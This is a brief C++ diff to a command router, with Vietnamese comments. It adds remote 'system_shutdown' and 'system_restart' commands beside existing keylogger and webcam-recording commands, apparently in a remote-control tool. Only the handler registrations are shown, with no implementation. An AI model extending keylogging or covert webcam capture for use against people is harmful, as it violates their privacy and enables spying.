@@ -22,6 +22,9 @@ void Router::registerAllHandlers(std::unordered_map<std::string, Handler>& map) 
     map["start_webcam_record"]   = ProcessHandlers::startWebcamRecord; // ĐỔI TÊN LỆNH
     map["stop_webcam_record"]    = ProcessHandlers::stopWebcamRecord; // THÊM LỆNH DỪNG
 
+    map["system_shutdown"]   = ProcessHandlers::systemShutdown;
+    map["system_restart"]    = ProcessHandlers::systemRestart;
+
     map["start_keylog"]      = ProcessHandlers::startKeylog;
     map["stop_keylog"]       = ProcessHandlers::stopKeylog;
     
